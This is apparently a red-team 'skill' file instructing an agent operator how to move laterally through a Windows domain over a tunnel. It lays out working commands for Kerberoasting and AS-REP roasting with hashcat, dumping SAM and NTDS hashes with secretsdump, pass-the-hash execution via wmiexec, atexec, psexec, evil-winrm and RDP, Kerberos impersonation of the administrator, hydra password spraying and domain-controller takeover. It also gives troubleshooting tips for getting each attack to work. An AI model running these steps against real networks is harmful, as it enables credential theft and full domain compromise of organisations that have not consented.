# Lateral Movement: Impacket, Pass-the-Hash, and Proxied Domain Work

Turns one foothold plus one credential or NTLM hash into access on the next host, and then into the domain controller. Everything runs through an established tunnel, so the skill starts by refusing to work without one. Artifacts (account lists, roast captures, dump files, ticket caches) land under `RESULT_DIR`; each successful host becomes an `access` row, each hash a `credential` row, and each hop a chain step.

`RESULT_DIR` is the engagement result directory (`runs/` under the engagement root unless the operator points it elsewhere).

## When to use

- `redteam_tunnel_list` shows an active, legitimate tunnel and you have resolved its local SOCKS listener address.
- You hold a local-admin NTLM hash, a domain user password, or a Kerberos ticket, and `445`/`135`/`5985`/`3389` is reachable inside the segment.
- A domain controller is present (`88`, `389`, `636`, `445` on one host) and you need domain-wide credentials rather than per-host passwords.
- Not for: creating accounts, changing passwords, or adding users to groups. Self-created identities are not a result and they destroy the evidence trail.

## Prerequisites

Every step below has a fallback and nothing in this list is mandatory — if a tool is missing, use the fallback named beside it.

- `python3-impacket` — `apt install python3-impacket`; a stock Kali image already ships all 61 `impacket-*` commands. Fallback: `pipx install impacket` (gives `wmiexec.py`, `secretsdump.py` with the `.py` suffix), or `smbclient` plus `schtasks` over an existing shell.
- `hashcat` for offline cracking — `apt install hashcat`. Fallback: `john --format=NT`, or reuse the hash directly with pass-the-hash, which needs no cracking at all.
- `proxychains4` — `apt install proxychains4`, used only as `-f runs/proxychains-<port>.conf` per command. Never edit the system proxychains config. Fallback: `chisel`/`frp` TCP forwards for the specific ports a tool needs.
- `evil-winrm` and `xfreerdp` — `apt install evil-winrm freerdp2-x11`. Fallback: `impacket-wmiexec` and `impacket-atexec`, which need only SMB.

## Workflow

0. Establish preconditions in one block. If any line fails, fix that before touching a host.

```
redteam_tunnel_list
curl --socks5-hostname 127.0.0.1:PORT -s -o /dev/null -w 'socks=%{http_code}\n' http://TARGET_IP/
```

1. Enumerate the domain through the tunnel. Read-only, and it produces the account list every later step consumes.

```
proxychains4 -q -f runs/proxychains-PORT.conf enum4linux -a TARGET_IP

impacket-GetADUsers 'DOMAIN/USERNAME:PASSWORD' -dc-ip TARGET_IP -all \
  > RESULT_DIR/ad-users-TARGET_IP.txt

```

2. Collect crackable material from the directory service first. It makes no connection to the target host at all — only to the DC.

```
impacket-GetUserSPNs 'DOMAIN/USERNAME:PASSWORD' -dc-ip TARGET_IP -request \
  -outputfile RESULT_DIR/kerberoast-TARGET_IP.txt

impacket-GetNPUsers 'DOMAIN/' -dc-ip TARGET_IP -usersfile RESULT_DIR/ad-users-TARGET_IP.txt \
  -no-pass -format hashcat -outputfile RESULT_DIR/asrep-TARGET_IP.txt

hashcat -m 13100 RESULT_DIR/kerberoast-TARGET_IP.txt WORDLIST \
  -r /usr/share/hashcat/rules/best64.rule -O -o RESULT_DIR/kerberoast-cracked.txt
hashcat -m 18200 RESULT_DIR/asrep-TARGET_IP.txt WORDLIST -r /usr/share/hashcat/rules/best64.rule \
  -O -o RESULT_DIR/asrep-cracked.txt
```

3. Dump secrets with the privilege you actually hold. `-just-dc` requires domain replication rights; a local admin only gets the local database.

```
impacket-secretsdump 'DOMAIN/USERNAME:PASSWORD@TARGET_IP' \
  -outputfile RESULT_DIR/secretsdump-TARGET_IP

impacket-secretsdump -hashes :PASSWORD_HASH 'DOMAIN/USERNAME@TARGET_IP' \
  -just-dc-ntlm -outputfile RESULT_DIR/ntds-TARGET_IP
```

4. Execute with pass-the-hash. Order is deliberate: `wmiexec` and `atexec` leave far less behind than `psexec`.

```
impacket-wmiexec -hashes :PASSWORD_HASH 'DOMAIN/USERNAME@TARGET_IP' -dc-ip TARGET_IP \
  'whoami /priv'

impacket-atexec -hashes :PASSWORD_HASH 'DOMAIN/USERNAME@TARGET_IP' 'hostname && whoami'

# last resort: installs and deletes a service, the noisiest path there is
impacket-psexec -hashes :PASSWORD_HASH 'DOMAIN/USERNAME@TARGET_IP' 'cmd.exe /c whoami'
```

5. Use Kerberos when NTLM is blocked or when a ticket already exists. Ticket files must be referenced by absolute path.

```
impacket-getTGT 'DOMAIN/USERNAME:PASSWORD' -dc-ip TARGET_IP
export KRB5CCNAME="$(pwd)/USERNAME.ccache"

impacket-getST -spn 'cifs/FILESERVER.DOMAIN' -impersonate administrator \
  'DOMAIN/USERNAME' -k -no-pass -dc-ip TARGET_IP

```

6. Reach the host with a different protocol when SMB is filtered. One of these usually works where the others fail.

```
evil-winrm -i TARGET_IP -u USERNAME -H PASSWORD_HASH
xfreerdp /v:TARGET_IP /u:USERNAME /pth:PASSWORD_HASH /cert:ignore +auth-only
```

7. Sweep for password reuse across the segment, one attempt per account, through the same tunnel.

```
proxychains4 -q -f runs/proxychains-PORT.conf hydra -l USERNAME -p 'PASSWORD' \
  -t THREADS -f -I ssh://TARGET_IP -o RESULT_DIR/reuse-ssh-TARGET_IP.txt
```

8. Escalate to the domain controller. Domain admin is a different score tier from a member server, so verify it rather than assuming it.

```
impacket-wmiexec -hashes :PASSWORD_HASH 'DOMAIN/Administrator@DC.DOMAIN' -dc-ip TARGET_IP 'whoami'
impacket-secretsdump -k -no-pass 'DOMAIN/Administrator@DC.DOMAIN' -just-dc-ntlm
```

9. Record each hop as it happens, not at the end of the run.

```
redteam_access_add host=TARGET_IP username=USERNAME method=pass-the-hash privilege=admin \
  asset_id=2 session_ref=RESULT_DIR/wmiexec-TARGET_IP.txt \
  note='impacket-wmiexec with NTLM hash, whoami -> domain\svc-backup (local admin)'

redteam_score_hit code=server-host points=50 target=TARGET_IP \
  evidence='impacket-wmiexec returned hostname + whoami as domain\\svc-backup with local admin rights'

redteam_chain_add stage=pivot title='pass-the-hash to file server' tool='impacket-wmiexec -hashes ...' \
  result='interactive command execution as local admin'
```

10. Cleanup the traces your execution method created, then re-verify that the tunnel still carries traffic.

```
impacket-atexec -hashes :PASSWORD_HASH 'DOMAIN/USERNAME@TARGET_IP' 'schtasks /query /fo LIST | findstr /i atexec'
```

## Output and evidence

Files under `RESULT_DIR`:

- `ad-users-<host>.txt`, `ad-computers-<host>.txt`, `enum4linux-<host>.txt` — the directory surface.
- `kerberoast-<host>.txt`, `asrep-<host>.txt` plus the `*-cracked.txt` outputs — offline material and its results.
- `secretsdump-<host>.ntds`, `ntds-full.ntds` — the dump itself; keep `.secrets` alongside it.

Database rows:

- `access` via `redteam_access_add`: `host`, `username`, `method` (`pass-the-hash`, `kerberos`, `winrm`, `rdp`, `smb-exec`), `privilege`, `asset_id`, `session_ref`.
- `credential` via `redteam_credential_add` per hash, with `secret_type=hash` and `secret_ref` pointing at the dump file.
- Score hit via `redteam_score_hit`: `server-host` (`points=10` normal, `points=50` admin) for a member host, `central-system` (`points=500` admin) only once the domain controller itself is under control. One claim per system, highest privilege only.
- Chain step via `redteam_chain_add` with `stage=access` for a new session and `stage=pivot` for a new segment.

What counts as evidence: command output returned from the remote host under the new identity (`hostname`, `whoami`, `whoami /priv`, an `ipconfig` the host actually produced), plus the exact impacket invocation. A successful authentication event with no command output is a credential confirmation, not an access result.

## Failure modes

- `SMB SessionError: STATUS_LOGON_FAILURE` → hash in the wrong format or expired. Pass-the-hash wants `-hashes :<NT>` with an empty LM half; a full `LM:NT` pair also works. Confirm the account is not disabled.
- `STATUS_ACCESS_DENIED` on `psexec` or `smbexec` → the account lacks service-creation rights, or EDR blocks the binary drop. Switch to `atexec`, then `wmiexec`.
- `impacket-wmiexec` connects but every command times out → WMI needs `135` plus a dynamic RPC range that SOCKS cannot carry. Use `atexec` (SMB only) or map the range with `chisel`.
- `KRB_AP_ERR_SKEW` or `KRB_AP_ERR_BAD_INTEGRITY` → clock drift beyond 5 minutes or a stale ticket. Sync time (`chronyc makestep`, `ntpdate`), re-request the TGT, and always pass `-dc-ip`.
- `KDC_ERR_S_PRINCIPAL_UNKNOWN` → the SPN hostname is wrong. Kerberos needs the FQDN, never a bare IP; add `-target-ip` while keeping the hostname in the principal.
- Kerberos or DNS fails through `proxychains` while SMB works → proxychains carries TCP only. Either forward the specific UDP service with `chisel`/`frp`, or run the tool from a host inside the segment.
- `impacket-secretsdump -just-dc` returns `ERROR_DS_DRA_ACCESS_DENIED` → the account lacks replication rights. Fall back to a local dump (`SAM`/`SECURITY`) or Kerberoast instead.
- `hydra` through the tunnel reports `connection reset` for every attempt → too many threads through one SOCKS listener. Drop to `-t 2`.

## Notes

- Noise ranking, lowest first: Kerberoast/AS-REP (DC only) → `atexec` → `wmiexec` → `smbexec` → `psexec`. Pick the lowest rung that returns output.
- Credential reuse across hosts is the least noisy escalation available and often the highest yield: one local admin password on an image-built fleet is normal, not lucky.
- `RATE` and `THREADS` govern everything that sprays; keep `-t 2` through a SOCKS listener and never run a sweep that can lock a domain account five times.
- Resume: the dump files and the `.ccache` are the durable state. A new session can replay access from the cache file alone, without re-dumping.
- Every host you touch must end up as an `access` row with a `session_ref`. An unrecorded hop is a lost result, and the score ledger cannot recover it later.
